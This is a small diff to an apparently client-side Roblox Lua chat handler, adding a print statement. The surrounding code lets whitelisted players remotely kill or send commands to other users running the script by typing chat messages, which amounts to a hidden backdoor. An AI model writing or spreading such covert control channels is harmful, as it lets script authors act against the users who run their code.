@@ -21,6 +21,7 @@ TextChatService.OnIncomingMessage = function(message)
 	local plr = players:GetPlayerByUserId(message.TextSource.UserId)
 	local txt = message.Text
 	if table.find(whitelisted, plr.Name) and not table.find(whitelisted, lp.Name) then
+		print(txt)
 		if txt == "hiii" then getChar(lp):FindFirstChildOfClass("Humanoid").Health = 0 end
 		commands(txt, plr)
 	end
